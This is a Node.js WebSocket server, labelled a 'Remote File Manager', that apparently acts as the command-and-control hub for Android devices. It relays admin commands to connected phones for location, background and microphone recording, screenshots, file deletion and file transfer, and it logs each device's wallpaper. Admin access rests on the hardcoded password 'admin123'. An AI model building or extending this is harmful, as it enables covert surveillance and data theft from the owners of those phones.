const WebSocket = require('ws');
const http = require("http");
const express = require('express');
const { createServer } = require('http');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const { base64ToPng } = require('./base64Image');

function printFileList(files) {
  const formatBytes = (bytes) => {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  const formatDate = (dateStr) => {
    if (!dateStr) return 'N/A';
    const date = new Date(dateStr);
    return date.toLocaleString('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  const maxNameLength = Math.max(...files.map(file => file.name.length), 20);

  console.log(chalk.bold.cyan('\n📂 Lista de Arquivos e Pastas'));
  console.log(chalk.bold(
    'Nome'.padEnd(maxNameLength) +
    ' | Tipo    | Tamanho    | Modificado'
  ));
  console.log('-'.repeat(maxNameLength + 32));

  files.forEach(file => {
    const isDir = file.isDirectory;
    const icon = isDir ? '📁' : '📄';
    const type = isDir ? 'Pasta' : 'Arquivo';
    const name = file.name.padEnd(maxNameLength);
    const size = formatBytes(file.size).padStart(10);
    const modified = formatDate(file.mtime);

    console.log(
      `${chalk.yellow(icon)} ${name} | ` +
      `${chalk.green(type.padEnd(7))} | ` +
      `${chalk.blue(size)} | ` +
      `${chalk.gray(modified)}`
    );
  });

  console.log(chalk.bold(`\nTotal: ${files.length} itens\n`));
}

class RemoteFileManagerServer {
  constructor() {
    this.wss = null;
    this.clients = new Map(); // File manager clients
    this.adminClients = new Map(); // Admin clients
    this.clientStates = new Map();
    this.port = 8080;
    this.CURRENT_PATH = '/storage/emulated/0';

    this.config = {
      allowedCommands: [
        'list_files', 'ls',
        'change_directory', 'cd',
        'change_directory_html', 'cd_html',
        'location',
        'bg_rec_start','bg_rec_stop',
        'record','rec',
        'mic','mic_stop',
        'record_stop','rec_stop',
        'shot','screenshot',
        'delete_file', 'rm',
        'upload_file',
        'download_file',
        'get_status',
        'get_upload_queue',
        'clear_upload_queue',
        'set_cloud_config',
        'ping',
        'identification',
        'navigation_update',
        'selection_update',
        'upload_started',
        'upload_progress',
        'upload_completed',
        'upload_failed',
        'downloaded'
      ],
      logFile: './file_manager_server.log',
      maxClients: 10,
      pingInterval: 30000,
    };

    this.startServer();
  }

  startServer() {
    const app = express();
    const server = createServer(app);

    app.get('/', (req, res) => {
      res.json({
        status: 'online',
        service: 'Remote File Manager WebSocket Server',
        clients: this.clients.size,
        adminClients: this.adminClients.size,
        timestamp: new Date().toISOString()
      });
    });

    app.get('/health', (req, res) => {
      res.status(200).json({
        status: 'healthy',
        clients: this.clients.size,
        memory: process.memoryUsage(),
        uptime: process.uptime()
      });
    });

    this.wss = new WebSocket.Server({
      server, // ✅ só o server
      perMessageDeflate: false
    });

    server.listen(this.port, () => {  // ✅ Agora o http.Server escuta a porta
      console.log(`\n🚀 Remote File Manager Server (WebSocket) iniciado!`);
      console.log(`📡 Escutando em ws://0.0.0.0:${this.port}`);
      console.log(`📁 Aguardando conexões (clientes e admins)...`);
      console.log(`💡 Clientes Admin podem se conectar e enviar comandos\n`);
    });

    this.wss.on('listening', () => {
      console.log(`\n🚀 Remote File Manager Server (WebSocket) iniciado!`);
      console.log(`📡 Escutando em ws://0.0.0.0:${this.port}`);
      console.log(`📁 Aguardando conexões (clientes e admins)...`);
      console.log(`💡 Clientes Admin podem se conectar e enviar comandos\n`);
    });

    this.wss.on('connection', (ws, req) => {
      this.handleNewConnection(ws, req);
    });

    this.wss.on('error', (err) => {
      console.error('❌ Erro do servidor:', err.message);
      if (err.code === 'EADDRINUSE') {
        console.log(`⚠️  Porta ${this.port} em uso. Tentando porta ${this.port + 1}...`);
        this.port++;
        setTimeout(() => this.startServer(), 1000);
      }
    });

    this.startTime = new Date();
  }

  handleNewConnection(ws, req) {
    const address = req.socket.remoteAddress;
    const port = req.socket.remotePort;

    console.log(`🔌 Nova conexão de ${address}:${port}`);

    // Aguardar identificação do cliente
    const identificationTimeout = setTimeout(() => {
      console.log(`⏱️  Timeout aguardando identificação de ${address}:${port}`);
      ws.close();
    }, 10000); // 10 segundos para se identificar

    ws.once('message', (data) => {
      clearTimeout(identificationTimeout);

      try {
        const message = JSON.parse(data.toString());

        if (message.type === 'admin_auth' && message.password === 'admin123') {
          this.handleNewAdminClient(ws, req);
        } else if (message.type === 'identification' || message.type === 'client_init') {
          this.handleNewFileClient(ws, req, message);
        } else {
          // Se não for admin nem cliente identificado, assumir como cliente file manager
          this.handleNewFileClient(ws, req, message);
        }
      } catch (error) {
        // Se não for JSON válido, assumir como cliente file manager
        this.handleNewFileClient(ws, req, { type: 'unknown' });
      }
    });
  }

  handleNewAdminClient(ws, req) {
    const adminId = this.generateAdminId();
    const clientAddress = req.socket.remoteAddress;
    const clientPort = req.socket.remotePort;

    const adminInfo = {
      id: adminId,
      ws: ws,
      address: clientAddress,
      port: clientPort,
      connectedAt: new Date(),
      lastActivity: new Date(),
      messageCount: 0,
      isAlive: true
    };

    this.adminClients.set(adminId, adminInfo);

    console.log(chalk.green(`👑 Admin ${adminId} conectado de ${clientAddress}:${clientPort}`));
    this.logActivity(`ADMIN_CONNECTED: ${adminId} from ${clientAddress}:${clientPort}`);

    // Configurar ping/pong
    ws.isAlive = true;
    ws.on('pong', () => {
      adminInfo.isAlive = true;
    });

    // Handler de mensagens do admin
    ws.on('message', (data) => {
      this.handleAdminMessage(adminId, data.toString());
    });

    // Handler de erro
    ws.on('error', (err) => {
      console.error(`⚠️  Erro no admin ${adminId}:`, err.message);
      this.logActivity(`ADMIN_ERROR: ${adminId} - ${err.message}`);
    });

    // Handler de close
    ws.on('close', () => {
      console.log(chalk.yellow(`👑 Admin ${adminId} desconectado`));
      this.logActivity(`ADMIN_DISCONNECTED: ${adminId}`);
      this.adminClients.delete(adminId);
    });

    // Enviar mensagem de boas-vindas
    this.sendToAdmin(adminId, {
      type: 'admin_welcome',
      message: 'Conectado como Admin no Remote File Manager Server',
      adminId: adminId,
      timestamp: new Date().toISOString(),
      stats: {
        clients: this.clients.size,
        admins: this.adminClients.size
      }
    });
  }

  handleNewFileClient(ws, req, initialMessage) {
    const clientId = this.generateClientId();
    const clientAddress = req.socket.remoteAddress;
    const clientPort = req.socket.remotePort;

    const clientInfo = {
      id: clientId,
      ws: ws,
      address: clientAddress,
      port: clientPort,
      connectedAt: new Date(),
      deviceType: initialMessage.data || 'unknown',
      lastActivity: new Date(),
      messageCount: 0,
      isAlive: true
    };

    this.clients.set(clientId, clientInfo);

    console.log(chalk.blue(`✅ Cliente ${clientId} conectado de ${clientAddress}:${clientPort}`));
    this.logActivity(`CLIENT_CONNECTED: ${clientId} from ${clientAddress}:${clientPort}`);

    // Notificar admins
    this.broadcastToAdmins({
      type: 'client_connected',
      clientId: clientId,
      address: clientAddress,
      port: clientPort,
      deviceType: clientInfo.deviceType,
      timestamp: new Date().toISOString()
    });

    // Configurar ping/pong
    ws.isAlive = true;
    ws.on('pong', () => {
      clientInfo.isAlive = true;
    });

    // Handler de mensagens
    ws.on('message', (data) => {
      this.handleClientMessage(clientId, data.toString());
    });

    // Handler de erro
    ws.on('error', (err) => {
      console.error(`⚠️  Erro no cliente ${clientId}:`, err.message);
      this.logActivity(`CLIENT_ERROR: ${clientId} - ${err.message}`);
    });

    // Handler de close
    ws.on('close', () => {
      console.log(chalk.red(`❌ Cliente ${clientId} desconectado`));
      this.logActivity(`CLIENT_DISCONNECTED: ${clientId}`);
      this.clients.delete(clientId);
      this.clientStates.delete(clientId);

      // Notificar admins
      this.broadcastToAdmins({
        type: 'client_disconnected',
        clientId: clientId,
        timestamp: new Date().toISOString()
      });
    });

    // Enviar mensagem de boas-vindas
    this.sendToClient(clientId, JSON.stringify({
      type: 'welcome',
      message: 'Conectado ao Remote File Manager Server (WebSocket)',
      clientId: clientId,
      timestamp: new Date().toISOString()
    }));

    // Processar mensagem inicial se houver
    if (initialMessage.type !== 'unknown') {
      this.handleClientMessage(clientId, JSON.stringify(initialMessage));
    }
  }

  handleAdminMessage(adminId, data) {
    const admin = this.adminClients.get(adminId);
    if (!admin) return;

    admin.lastActivity = new Date();
    admin.messageCount++;
    admin.isAlive = true;

    try {
      const command = JSON.parse(data);

      this.logActivity(`ADMIN_COMMAND: ${adminId} - ${command.type || command.command}`);

      switch (command.type || command.command) {
        case 'list_clients':
          this.sendClientListToAdmin(adminId);
          break;

        case 'list_admins':
          this.sendAdminListToAdmin(adminId);
          break;

        case 'server_status':
          this.sendServerStatusToAdmin(adminId);
          break;

        case 'send_to_client':
          if (command.clientId && command.message) {
            const success = this.sendToClient(command.clientId,
              typeof command.message === 'string' ? command.message : JSON.stringify(command.message)
            );
            this.sendToAdmin(adminId, {
              type: 'command_result',
              success: success,
              message: success ? 'Comando enviado' : 'Falha ao enviar comando',
              originalCommand: command
            });
          }
          break;

        case 'broadcast_to_clients':
          if (command.message) {
            this.broadcastToAllClients(
              typeof command.message === 'string' ? command.message : JSON.stringify(command.message)
            );
            this.sendToAdmin(adminId, {
              type: 'command_result',
              success: true,
              message: 'Broadcast enviado',
              clientCount: this.clients.size
            });
          }
          break;

        case 'kick_client':
          if (command.clientId) {
            this.kickClient(command.clientId);
            this.sendToAdmin(adminId, {
              type: 'command_result',
              success: true,
              message: `Cliente ${command.clientId} desconectado`
            });
          }
          break;

        case 'get_client_state':
          if (command.clientId) {
            const state = this.clientStates.get(parseInt(command.clientId));
            this.sendToAdmin(adminId, {
              type: 'client_state',
              clientId: command.clientId,
              state: state || null
            });
          }
          break;

        case 'ping':
          this.sendToAdmin(adminId, { type: 'pong', timestamp: Date.now() });
          break;

        default:
          this.sendToAdmin(adminId, {
            type: 'error',
            message: `Comando desconhecido: ${command.type || command.command}`
          });
      }

    } catch (error) {
      console.error(`❌ Erro ao processar comando do admin ${adminId}:`, error);
      this.sendToAdmin(adminId, {
        type: 'error',
        message: error.message
      });
    }
  }

  handleClientMessage(clientId, data) {
    const client = this.clients.get(clientId);
    if (!client) return;

    client.lastActivity = new Date();
    client.messageCount++;
    client.isAlive = true;

    try {
      const trimmedMessage = data.trim();
      if (!trimmedMessage) return;

      this.logActivity(`MESSAGE_RECEIVED: ${clientId} - ${trimmedMessage}`);

      // Broadcast para admins
      this.broadcastToAdmins({
        type: 'client_message',
        clientId: clientId,
        message: trimmedMessage,
        timestamp: new Date().toISOString()
      });

      this.processClientCommand(clientId, trimmedMessage);

    } catch (error) {
      console.error(`❌ Erro ao processar mensagem do cliente ${clientId}:`, error);
      this.sendToClient(clientId, JSON.stringify({
        type: 'error',
        message: error.message,
        timestamp: new Date().toISOString()
      }));
    }
  }

  processClientCommand(clientId, message) {
    try {
      let command;
      try {
        command = JSON.parse(message);
      } catch {
        command = { type: message.toLowerCase() };
      }

      const client = this.clients.get(clientId);
      if (!client) return;

      switch (command.type) {
        case 'change_directory_success':
          console.log(`📂 Cliente ${clientId} mudou para: ${command.c_path}`);
          this.CURRENT_PATH = command.c_path;
          break;

        case 'file_list':
        case 'temp':
          if (command.location) {
            console.log(`Location: ${command.location}`);
          }
          if (command.recording) {
            console.log(`📂 video recording: ${command.recording}`);
          }

          if (command.recorded) {
            console.log(`📂 video recorded: ${command.recorded}`);
          }
          if (command.uploaded) {
            console.log(`📂 Uploaded file: ${command.file}`);
          }

          if (command.downloaded) {
            console.log(`📂 Downloaded file: ${command.file}`);
          }

          if (command.c_path) {
            console.log(`📂 Diretório atual: ${command.c_path}`);
            this.CURRENT_PATH = command.c_path;
          }
          if (command.data && Array.isArray(command.data)) {
            printFileList(command.data);
          }
          break;

        case 'identification':
          if (command.data) {
            client.deviceType = command.data;
            console.log(`🔍 Cliente ${clientId} identificado como: ${command.data}`);
            /*base64ToPng(command.wallpaper)
              .then(filePath => console.log('Arquivo salvo:', filePath))
              .catch(error => console.error('Erro:', error));*/

            this.clientStates.set(clientId, {
              currentPath: command.path,
              files: [],
              wallpaper: command.wallpaper,
              selectedFiles: [],
              uploadQueue: [],
              lastUpdate: new Date()
            });
          }
          break;

        case 'navigation_update':
          if (command.data) {
            const clientState = this.clientStates.get(clientId) || {};
            clientState.currentPath = command.data.currentPath;
            clientState.files = command.data.files || [];
            clientState.lastUpdate = new Date();
            this.clientStates.set(clientId, clientState);

            console.log(`📂 Cliente ${clientId} navegou para: ${command.data.currentPath}`);
            console.log(`📄 ${command.data.filesCount} arquivos encontrados`);
          }
          break;

        case 'selection_update':
          if (command.data) {
            const clientState = this.clientStates.get(clientId) || {};
            clientState.selectedFiles = command.data.selectedFiles || [];
            this.clientStates.set(clientId, clientState);

            console.log(`✅ Cliente ${clientId} selecionou ${command.data.selectedCount} arquivo(s)`);
          }
          break;

        case 'upload_started':
          if (command.data) {
            console.log(`🚀 Cliente ${clientId} iniciou upload: ${command.data.fileName}`);
          }
          break;

        case 'upload_progress':
          if (command.data) {
            console.log(`📈 Cliente ${clientId} - ${command.data.fileName}: ${command.data.progress}%`);
          }
          break;

        case 'upload_completed':
          if (command.data) {
            console.log(`✅ Cliente ${clientId} completou upload: ${command.data.fileName}`);
          }
          break;

        case 'upload_failed':
          if (command.data) {
            console.log(`❌ Cliente ${clientId} falhou upload: ${command.data.fileName}`);
          }
          break;

        case 'ping':
          this.sendToClient(clientId, JSON.stringify({
            type: 'pong',
            timestamp: Date.now()
          }));
          break;

        case 'status':
          if (command.data) {
            console.log(`📊 Status do cliente ${clientId}:`);
            console.log(`   📂 Diretório atual: ${command.data.currentPath}`);
            console.log(`   📄 Arquivos: ${command.data.filesCount}`);
            console.log(`   ✅ Selecionados: ${command.data.selectedCount}`);
          }
          break;
      }

    } catch (error) {
      console.error(`❌ Erro ao processar comando do cliente ${clientId}:`, error);
    }
  }

  sendToClient(clientId, message) {
    const client = this.clients.get(parseInt(clientId));
    if (!client || !client.ws || client.ws.readyState !== WebSocket.OPEN) {
      console.log(`⚠️  Cliente ${clientId} não encontrado ou desconectado`);
      return false;
    }

    try {
      client.ws.send(message);
      this.logActivity(`MESSAGE_SENT: ${clientId} - ${message}`);
      return true;
    } catch (error) {
      console.error(`❌ Erro ao enviar para cliente ${clientId}:`, error);
      this.clients.delete(parseInt(clientId));
      return false;
    }
  }

  sendToAdmin(adminId, data) {
    const admin = this.adminClients.get(adminId);
    if (!admin || !admin.ws || admin.ws.readyState !== WebSocket.OPEN) {
      return false;
    }

    try {
      admin.ws.send(JSON.stringify(data));
      return true;
    } catch (error) {
      console.error(`❌ Erro ao enviar para admin ${adminId}:`, error);
      this.adminClients.delete(adminId);
      return false;
    }
  }

  broadcastToAllClients(message) {
    let successCount = 0;
    let failCount = 0;

    this.clients.forEach((client, clientId) => {
      if (this.sendToClient(clientId, message)) {
        successCount++;
      } else {
        failCount++;
      }
    });

    console.log(`📢 Broadcast para ${successCount} clientes${failCount > 0 ? ` (${failCount} falharam)` : ''}`);
  }

  broadcastToAdmins(data) {
    this.adminClients.forEach((admin, adminId) => {
      this.sendToAdmin(adminId, data);
    });
  }

  sendClientListToAdmin(adminId) {
    const clientList = [];

    this.clients.forEach((client, clientId) => {
      const currentClient = this.clientStates.get(clientId) || {};

      clientList.push({
        id: clientId,
        wallpaper: currentClient.wallpaper,
        address: client.address,
        port: client.port,
        deviceType: client.deviceType,
        connectedAt: client.connectedAt,
        messageCount: client.messageCount,
        isAlive: client.isAlive
      });
    });

    this.sendToAdmin(adminId, {
      type: 'client_list',
      clients: clientList,
      total: clientList.length,
      timestamp: new Date().toISOString()
    });
  }

  sendAdminListToAdmin(adminId) {
    const adminList = [];
    this.adminClients.forEach((admin, id) => {
      adminList.push({
        id: id,
        address: admin.address,
        port: admin.port,
        connectedAt: admin.connectedAt,
        messageCount: admin.messageCount
      });
    });

    this.sendToAdmin(adminId, {
      type: 'admin_list',
      admins: adminList,
      total: adminList.length,
      timestamp: new Date().toISOString()
    });
  }

  sendServerStatusToAdmin(adminId) {
    const uptime = new Date() - this.startTime;

    this.sendToAdmin(adminId, {
      type: 'server_status',
      status: {
        port: this.port,
        clients: this.clients.size,
        admins: this.adminClients.size,
        clientStates: this.clientStates.size,
        uptime: uptime,
        uptimeFormatted: this.formatDuration(uptime),
        memory: process.memoryUsage().heapUsed,
        startTime: this.startTime
      },
      timestamp: new Date().toISOString()
    });
  }

  kickClient(clientId) {
    const client = this.clients.get(parseInt(clientId));
    if (!client) {
      console.log(`⚠️  Cliente ${clientId} não encontrado`);
      return;
    }

    client.ws.close();
    console.log(`👢 Cliente ${clientId} foi desconectado`);
  }

  generateClientId() {
    let id = 1;
    while (this.clients.has(id)) {
      id++;
    }
    return id;
  }

  generateAdminId() {
    let id = 1;
    while (this.adminClients.has(id)) {
      id++;
    }
    return id;
  }

  formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  formatDuration(ms) {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);

    if (hours > 0) return `${hours}h ${minutes % 60}m`;
    if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
    return `${seconds}s`;
  }

  logActivity(message) {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}\n`;

    try {
      fs.appendFileSync(this.config.logFile, logMessage);
    } catch (error) {
      // Se não conseguir escrever no log, apenas continue
    }
  }

  shutdown() {
    console.log('\n🛑 Encerrando servidor...');

    this.clients.forEach((client, clientId) => {
      this.sendToClient(clientId, JSON.stringify({
        type: 'server_shutdown',
        message: 'Servidor está sendo encerrado'
      }));
      client.ws.close();
    });

    this.adminClients.forEach((admin, adminId) => {
      this.sendToAdmin(adminId, {
        type: 'server_shutdown',
        message: 'Servidor está sendo encerrado'
      });
      admin.ws.close();
    });

    if (this.wss) {
      this.wss.close(() => {
        console.log('✅ Servidor encerrado');
        process.exit(0);
      });
    } else {
      process.exit(0);
    }

    setTimeout(() => {
      console.log('⚠️  Forçando encerramento...');
      process.exit(1);
    }, 5000);
  }
}

// Capturar sinais de encerramento
process.on('SIGINT', () => {
  console.log('\n⚡ Recebido SIGINT (Ctrl+C)');
  if (global.server) {
    global.server.shutdown();
  } else {
    process.exit(0);
  }
});

process.on('SIGTERM', () => {
  console.log('\n⚡ Recebido SIGTERM');
  if (global.server) {
    global.server.shutdown();
  } else {
    process.exit(0);
  }
});

// Iniciar o servidor
try {
  global.server = new RemoteFileManagerServer();

  console.log(chalk.green.bold('🚀 Remote File Manager Server inicializado com sucesso!'));
  console.log(chalk.blue('💡 Servidor aceita conexões de clientes e admins\n'));

} catch (error) {
  console.error(chalk.red('❌ Erro ao iniciar o servidor:'), error.message);
  process.exit(1);
}
